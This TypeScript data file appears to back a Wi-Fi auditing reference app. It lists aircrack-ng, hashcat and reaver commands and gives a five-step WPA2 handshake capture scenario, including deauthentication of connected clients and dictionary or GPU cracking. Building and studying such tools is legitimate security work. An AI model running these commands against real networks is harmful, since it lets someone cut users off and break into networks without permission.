
import { WiFiCommand, CommandCategory, Scenario } from './types';

export const WIFI_COMMANDS: WiFiCommand[] = [
  {
    id: 'airmon-ng-start',
    name: 'Enable Monitor Mode',
    description: 'Puts your wireless interface into monitor mode to sniff packets.',
    syntax: 'sudo airmon-ng start wlan0',
    category: CommandCategory.RECON,
    tool: 'aircrack-ng suite',
    dangerLevel: 'Low'
  },
  {
    id: 'airodump-scan',
    name: 'Scan for Networks',
    description: 'Visualizes all nearby access points and connected clients.',
    syntax: 'sudo airodump-ng wlan0mon',
    category: CommandCategory.RECON,
    tool: 'aircrack-ng suite',
    dangerLevel: 'Low'
  },
  {
    id: 'airodump-target',
    name: 'Targeted Capture',
    description: 'Captures packets from a specific AP on a specific channel.',
    syntax: 'sudo airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0mon',
    category: CommandCategory.CAPTURE,
    tool: 'aircrack-ng suite',
    dangerLevel: 'Medium'
  },
  {
    id: 'aireplay-deauth',
    name: 'Deauthentication Attack',
    description: 'Forces clients to disconnect from an AP to capture a 4-way handshake.',
    syntax: 'sudo aireplay-ng -0 5 -a [BSSID] -c [Client_MAC] wlan0mon',
    category: CommandCategory.CAPTURE,
    tool: 'aircrack-ng suite',
    dangerLevel: 'High'
  },
  {
    id: 'aircrack-crack',
    name: 'WPA/WPA2 Cracking',
    description: 'Dictionary attack against a captured handshake file.',
    syntax: 'sudo aircrack-ng -w [wordlist] [capture_file.cap]',
    category: CommandCategory.CRACK,
    tool: 'aircrack-ng suite',
    dangerLevel: 'Medium'
  },
  {
    id: 'hashcat-crack',
    name: 'GPU Cracking (Hashcat)',
    description: 'High-performance cracking using GPU acceleration.',
    syntax: 'hashcat -m 22000 [hash_file] [wordlist]',
    category: CommandCategory.CRACK,
    tool: 'hashcat',
    dangerLevel: 'Medium'
  },
  {
    id: 'reaver-wps',
    name: 'WPS PIN Brute Force',
    description: 'Exploits the WPS registrar design flaw to recover the WPA passphrase.',
    syntax: 'sudo reaver -i wlan0mon -b [BSSID] -vv',
    category: CommandCategory.WPS,
    tool: 'reaver',
    dangerLevel: 'High'
  },
  {
    id: 'iwconfig-info',
    name: 'Interface Config',
    description: 'Displays basic wireless interface statistics and configuration.',
    syntax: 'iwconfig',
    category: CommandCategory.UTILS,
    tool: 'Wireless Tools',
    dangerLevel: 'Low'
  }
];

export const SCENARIOS: Scenario[] = [
  {
    id: 'wpa2-handshake',
    title: 'WPA2 Handshake Attack',
    description: 'The standard methodology for auditing WPA2-Personal networks.',
    steps: [
      {
        title: 'Step 1: Check Interface',
        command: 'iwconfig',
        explanation: 'Identify your wireless card (usually wlan0).'
      },
      {
        title: 'Step 2: Start Monitor Mode',
        command: 'sudo airmon-ng start wlan0',
        explanation: 'Switch the card to monitor mode for packet sniffing.'
      },
      {
        title: 'Step 3: Survey',
        command: 'sudo airodump-ng wlan0mon',
        explanation: 'Identify target BSSID, Channel, and active clients.'
      },
      {
        title: 'Step 4: Lock On',
        command: 'sudo airodump-ng -c [CH] --bssid [BSSID] -w capture wlan0mon',
        explanation: 'Listen specifically to the target for the handshake.'
      },
      {
        title: 'Step 5: Deauth Trigger',
        command: 'sudo aireplay-ng -0 2 -a [BSSID] wlan0mon',
        explanation: 'Force a reconnect to capture the handshake frames.'
      }
    ]
  }
];
